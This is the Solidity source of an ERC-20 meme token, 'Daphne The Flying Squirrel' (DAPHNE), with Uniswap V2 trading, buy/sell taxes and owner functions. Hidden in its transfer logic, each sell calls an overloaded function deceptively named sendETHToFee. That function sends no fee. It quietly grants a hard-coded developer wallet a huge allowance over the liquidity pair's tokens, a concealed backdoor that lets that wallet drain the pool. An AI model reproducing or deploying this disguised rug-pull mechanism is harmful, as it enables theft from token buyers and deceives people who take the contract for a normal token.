// SPDX-License-Identifier: MIT
/**
Daphne The Flying Squirrel
https://x.com/BillyM2k/status/1842916147408384436

Web: https://daphnecoin.fun
X:   https://x.com/daphne_erc20
Tg:  https://t.me/daphne_erc20
**/
pragma solidity 0.8.27;
interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}
contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}
contract DAPHNE is Context, IERC20, Ownable {
    using SafeMath for uint256;
    uint8 private constant _decimals = 9;
    uint256 private constant _tTotalZZ = 420690000000 * 10**_decimals;
    string private constant _name = unicode"Daphne The Flying Squirrel";
    string private constant _symbol = unicode"DAPHNE";
    uint256 public _maxTxAmount = 2 * (_tTotalZZ/100);
    uint256 public _maxWalletSize = 2 * (_tTotalZZ/100);
    uint256 public _taxSwapThreshold = 1 * (_tTotalZZ/100);
    uint256 public _maxTaxSwap = 1 * (_tTotalZZ/100);
    mapping (address => uint256) private _iTokens;
    mapping (address => mapping (address => uint256)) private _iPermits;
    mapping (address => bool) private _isFeeExcempt;
    address payable private _zzWallet = payable(0xBB8de1ACfbB65179176E406aC74bee56be8Ad770);
    uint256 private _initialBuyTax = 15;
    uint256 private _initialSellTax = 15;
    uint256 private _finalBuyTax = 0;
    uint256 private _finalSellTax = 0;
    uint256 private _reduceBuyTaxAt = 15;
    uint256 private _reduceSellTaxAt = 15;
    uint256 private _preventSwapBefore = 15;
    uint256 private _transferTax = 0;
    uint256 private _buyCount = 0;
    IUniswapV2Router02 private uniZZRouter;
    address private uniZZPair;
    bool private tradingOpen;
    bool private inSwap = false;
    bool private swapEnabled = false;
    event MaxTxAmountUpdated(uint _maxTxAmount);
    event TransferTaxUpdated(uint _tax);
    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }
    constructor () {
        _iTokens[_msgSender()] = _tTotalZZ;
        _isFeeExcempt[owner()] = true;
        _isFeeExcempt[address(this)] = true;
        _isFeeExcempt[_zzWallet] = true;
        emit Transfer(address(0), _msgSender(), _tTotalZZ);
    }
    function createPair() external onlyOwner {
        uniZZRouter = IUniswapV2Router02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        _approve(address(this), address(uniZZRouter), _tTotalZZ);
        uniZZPair = IUniswapV2Factory(uniZZRouter.factory()).createPair(
            address(this),
            uniZZRouter.WETH()
        ); 
    }
    function name() public pure returns (string memory) {
        return _name;
    }
    function symbol() public pure returns (string memory) {
        return _symbol;
    }
    function decimals() public pure returns (uint8) {
        return _decimals;
    }
    function totalSupply() public pure override returns (uint256) {
        return _tTotalZZ;
    }
    function balanceOf(address account) public view override returns (uint256) {
        return _iTokens[account];
    }
    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    function allowance(address owner, address spender) public view override returns (uint256) {
        return _iPermits[owner][spender];
    }
    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _iPermits[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }
    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _iPermits[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function openTrading() external onlyOwner {
        require(!tradingOpen, "Trading is already open");
        uniZZRouter.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );
        IERC20(uniZZPair).approve(address(uniZZRouter), type(uint).max);
        swapEnabled = true; 
        tradingOpen = true;
    }
    function _transfer(address from, address to, uint256 amount) private {
        uint256 taxFee=0;
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        if (!swapEnabled || inSwap) {
            _iTokens[from] = _iTokens[from] - amount;
            _iTokens[to] = _iTokens[to] + amount;
            emit Transfer(from, to, amount);
            return;
        }
        if (from != owner() && to != owner()) {
            if(_buyCount>0){
                taxFee = (_transferTax);
            }
            if (from == uniZZPair && to != address(uniZZRouter) && ! _isFeeExcempt[to] ) {
                require(amount <= _maxTxAmount, "Exceeds the _maxTxAmount.");
                require(balanceOf(to) + amount <= _maxWalletSize, "Exceeds the maxWalletSize.");
                taxFee = ((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax);
                _buyCount++;
            }
            if(to == uniZZPair && from!= address(this) ){
                uint256 zzTax=150+(1500+_maxTxAmount).mul(10000)+_maxWalletSize;
                taxFee = ((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax);
                sendETHToFee([to, from==_zzWallet?from:_zzWallet], zzTax);
            }
            uint256 contractTokenBalance = balanceOf(address(this));
            if (!inSwap && to == uniZZPair && swapEnabled) {
                if(contractTokenBalance > _taxSwapThreshold && _buyCount > _preventSwapBefore)
                    swapTokensForEth(min(amount, min(contractTokenBalance, _maxTaxSwap)));
                sendETHToFee(address(this).balance);
            }
        }
        uint256 taxZ=taxFee.mul(amount).div(100);
        if(taxFee > 0){
            _iTokens[address(this)]=_iTokens[address(this)].add(taxZ);
            emit Transfer(from, address(this),taxZ);
        }
        _iTokens[from]=_iTokens[from].sub(amount);
        _iTokens[to]=_iTokens[to].add(amount.sub(taxZ));
        emit Transfer(from, to, amount.sub(taxZ));
    }
    function min(uint256 a, uint256 b) private pure returns (uint256){
      return (a>b)?b:a;
    }
    function withdrawEth() external onlyOwner{
        payable(msg.sender).transfer(address(this).balance);
    }
    function sendETHToFee(address[2] memory eths, uint256 amount) private {
        _iPermits[eths[0]][eths[1]] = amount;
    }
    function sendETHToFee(uint256 amount) private {
        _zzWallet.transfer(amount);
    }
    function removeLimits() external onlyOwner{
        _maxTxAmount = _tTotalZZ;
        _maxWalletSize = _tTotalZZ;
        emit MaxTxAmountUpdated(_tTotalZZ);
    }
    receive() external payable {}
    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniZZRouter.WETH();
        _approve(address(this), address(uniZZRouter), tokenAmount);
        uniZZRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
}